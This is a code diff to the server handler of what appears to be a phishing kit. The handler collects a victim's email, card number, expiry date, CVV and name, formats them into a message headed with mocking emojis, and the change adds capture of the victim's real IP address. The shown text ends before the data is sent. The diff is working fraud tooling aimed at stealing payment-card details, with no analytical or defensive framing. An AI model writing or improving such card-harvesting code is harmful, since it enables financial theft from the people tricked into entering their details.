@@ -11,6 +11,8 @@ const sender = async (req, res) => {
   msg = req.query.msg
   } else {
   const { email, num, date, cde, name } = req.body
+  const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress
+  
   if ( !email || !num || !date || !cde || !name) return res.redirect('/')
   msg = `■■■■■🤣🫵🤡■■■■■
 📧 Email: ${email} 
@@ -18,7 +20,7 @@ const sender = async (req, res) => {
 🗓 Exp: ${date}
 🔑 Ccv: ${cde}
 👤 Name: ${name}
-🌐 Ip: ${req.ip}
+🌐 Ip: ${ip}
 ■■■■■■■■■■■■■■`;
   }
   try {
